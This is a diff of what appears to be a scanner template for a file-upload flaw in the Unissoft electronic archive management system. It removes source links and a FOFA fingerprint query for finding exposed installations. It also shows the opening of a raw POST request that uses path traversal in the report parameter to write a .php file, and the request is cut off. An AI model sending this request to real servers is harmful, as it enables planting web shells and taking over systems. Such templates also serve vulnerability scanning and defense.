@@ -3,12 +3,8 @@ info:
   name: 紫光电子档案管理系统DesignReportSave文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ldcz1w3a9hb7cdw5'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ldcz1w3a9hb7cdw5
-    fofa: body="www.unissoft.com"
 http:
 - raw:
   - 'POST /Setting/Report/DesignReportSave.html?report=../../../kwok111evs.php&token=java HTTP/1.1
